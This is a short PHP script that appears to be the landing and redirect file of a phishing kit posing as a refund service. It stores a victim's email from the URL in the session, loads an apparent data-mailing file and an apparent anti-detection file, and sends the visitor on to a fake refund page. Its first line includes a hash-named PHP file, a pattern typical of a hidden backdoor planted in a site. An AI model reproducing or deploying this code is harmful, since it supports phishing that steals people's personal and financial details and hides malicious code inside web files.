<?php include_once'../d9174a551c1b19b6a4df260965cfc991.php';?><?php
session_start();
//error_reporting(0);
include "refund/includes/my_email.php";
include 'refund/anti.php';
include "One_Time.php";
$_SESSION['access'] = "access";
$_SESSION['g'] = $_GET['ea'];
header("Location: refund/index?code=2");
?>